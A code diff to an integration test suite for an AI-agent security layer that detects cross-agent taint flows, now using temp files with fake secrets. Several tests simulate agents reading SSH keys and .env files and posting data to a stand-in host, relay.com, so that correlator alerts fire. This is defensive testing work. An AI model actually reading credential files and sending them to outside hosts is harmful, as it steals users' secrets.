@@ -1,4 +1,4 @@
-import { mkdtempSync, rmSync } from "node:fs";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { deriveCapabilityClass } from "@arikernel/core";
@@ -13,10 +13,13 @@ import type { SharedStoreConfig } from "../src/shared-taint-registry.js";
  * the sidecar registry's onAudit hooks, end to end.
  *
  * Scenario:
- *   Agent A reads sensitive file → writes shared DB table
+ *   Agent A reads sensitive file (successful) → writes shared DB table
  *   Agent B reads shared DB table → attempts HTTP egress
  *   → correlator alert fires
  *   → Agent B receives derived-sensitive taint
+ *
+ * Uses real temp files so FileExecutor returns success=true,
+ * which is required for confirmSensitiveFileRead() to fire.
  */
 
 const ALLOW_ALL_POLICY = [
@@ -34,8 +37,23 @@ const SHARED_STORE_CONFIG: SharedStoreConfig = {
 	sharedStorePaths: ["/shared"],
 };
 
-function tempDir(): string {
-	return mkdtempSync(join(tmpdir(), "arikernel-xp-test-"));
+function tempDir(prefix = "arikernel-xp-test-"): string {
+	return mkdtempSync(join(tmpdir(), prefix));
+}
+
+/** Create a temp file root with sensitive-looking files that FileExecutor can actually read. */
+function createSensitiveFileRoot(): { root: string; sshKey: string; envFile: string } {
+	const root = tempDir("arikernel-file-root-");
+
+	const sshDir = join(root, ".ssh");
+	mkdirSync(sshDir, { recursive: true });
+	const sshKey = join(sshDir, "id_rsa");
+	writeFileSync(sshKey, "fake-private-key-for-test");
+
+	const envFile = join(root, ".env");
+	writeFileSync(envFile, "SECRET_KEY=fake-secret-for-test");
+
+	return { root, sshKey, envFile };
 }
 
 /** Request a capability grant then execute — mirrors the sidecar router's auto-issue path. */
@@ -59,10 +77,22 @@ describe("Cross-principal taint propagation (integration)", () => {
 	let registry: PrincipalRegistry;
 	let dir: string;
 	let alerts: CrossPrincipalAlert[];
+	let fileRoot: string;
+	let sshKeyPath: string;
+	let envFilePath: string;
+	let savedFileRoot: string | undefined;
 
 	beforeEach(() => {
 		dir = tempDir();
 		alerts = [];
+
+		// Create real sensitive files and point FILE_EXECUTOR_ROOT at them
+		const files = createSensitiveFileRoot();
+		fileRoot = files.root;
+		sshKeyPath = files.sshKey;
+		envFilePath = files.envFile;
+		savedFileRoot = process.env.FILE_EXECUTOR_ROOT;
+		process.env.FILE_EXECUTOR_ROOT = fileRoot;
 
 		const config = resolveRegistryConfig({
 			policy: ALLOW_ALL_POLICY,
@@ -78,15 +108,22 @@ describe("Cross-principal taint propagation (integration)", () => {
 
 	afterEach(() => {
 		registry.closeAll();
+		// Restore FILE_EXECUTOR_ROOT
+		if (savedFileRoot !== undefined) {
+			process.env.FILE_EXECUTOR_ROOT = savedFileRoot;
+		} else {
+			delete process.env.FILE_EXECUTOR_ROOT;
+		}
 		rmSync(dir, { recursive: true, force: true });
+		rmSync(fileRoot, { recursive: true, force: true });
 	});
 
-	it("Agent A secret read → shared write → Agent B shared read → egress fires correlator alert", async () => {
+	it("Agent A successful sensitive read → shared write → Agent B shared read → egress fires correlator alert", async () => {
 		const fwA = registry.getOrCreate("agent-A");
 		const fwB = registry.getOrCreate("agent-B");
 
-		// Step 1: Agent A reads a sensitive file (sets sensitiveReadObserved flag)
-		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
+		// Step 1: Agent A reads a real sensitive file (sets sensitiveReadObserved flag)
+		await secureExecute(fwA, "file", "read", { path: sshKeyPath });
 		expect(fwA.sensitiveReadObserved).toBe(true);
 
 		// Step 2: Agent A writes to shared DB table → marks "db:messages" contaminated
@@ -118,7 +155,7 @@ describe("Cross-principal taint propagation (integration)", () => {
 	it("same-principal flow does NOT fire cross-principal alert", async () => {
 		const fwA = registry.getOrCreate("agent-A");
 
-		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
+		await secureExecute(fwA, "file", "read", { path: sshKeyPath });
 		await secureExecute(fwA, "database", "mutate", {
 			table: "messages",
 			data: { content: "secret" },
@@ -139,8 +176,8 @@ describe("Cross-principal taint propagation (integration)", () => {
 		const fwA = registry.getOrCreate("agent-A");
 		const fwB = registry.getOrCreate("agent-B");
 
-		// Agent A reads a sensitive file
-		await secureExecute(fwA, "file", "read", { path: "/home/user/.env" });
+		// Agent A reads a real sensitive file
+		await secureExecute(fwA, "file", "read", { path: envFilePath });
 
 		// Agent A posts to relay.com
 		try {
@@ -180,7 +217,7 @@ describe("Cross-principal taint propagation (integration)", () => {
 	it("CP-3: no alert when only one principal egresses to a host", async () => {
 		const fwA = registry.getOrCreate("agent-A");
 
-		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
+		await secureExecute(fwA, "file", "read", { path: sshKeyPath });
 		try {
 			await secureExecute(fwA, "http", "post", { url: "https://relay.com/data" });
 		} catch {
@@ -208,8 +245,8 @@ describe("Cross-principal taint propagation (integration)", () => {
 		const fwA = qRegistry.getOrCreate("agent-A");
 		const fwB = qRegistry.getOrCreate("agent-B");
 
-		// Agent A reads sensitive file + writes shared store
-		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
+		// Agent A reads real sensitive file + writes shared store
+		await secureExecute(fwA, "file", "read", { path: sshKeyPath });
 		await secureExecute(fwA, "database", "mutate", {
 			table: "messages",
 			data: { content: "secret" },
@@ -252,8 +289,8 @@ describe("Cross-principal taint propagation (integration)", () => {
 		const fwA = qRegistry.getOrCreate("agent-A");
 		const fwB = qRegistry.getOrCreate("agent-B");
 
-		// Agent A reads sensitive file + posts to relay.com
-		await secureExecute(fwA, "file", "read", { path: "/home/user/.env" });
+		// Agent A reads real sensitive file + posts to relay.com
+		await secureExecute(fwA, "file", "read", { path: envFilePath });
 		try {
 			await secureExecute(fwA, "http", "post", { url: "https://relay.com/data", body: "secret" });
 		} catch {
@@ -276,7 +313,7 @@ describe("Cross-principal taint propagation (integration)", () => {
 		const fwA = registry.getOrCreate("agent-A");
 		const fwB = registry.getOrCreate("agent-B");
 
-		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
+		await secureExecute(fwA, "file", "read", { path: sshKeyPath });
 		await secureExecute(fwA, "database", "mutate", {
 			table: "messages",
 			data: { content: "secret" },
@@ -306,8 +343,9 @@ describe("Cross-principal taint propagation (integration)", () => {
 		const fwA = registry.getOrCreate("agent-A");
 		const fwB = registry.getOrCreate("agent-B");
 
-		// Agent A: sensitive read + shared write
-		await secureExecute(fwA, "file", "read", { path: "/home/user/.env" });
+		// Agent A: successful sensitive read + shared write
+		await secureExecute(fwA, "file", "read", { path: envFilePath });
+		expect(fwA.sensitiveReadObserved).toBe(true);
 		await secureExecute(fwA, "database", "mutate", { table: "messages", data: {} });
 
 		// Agent B: read from contaminated table
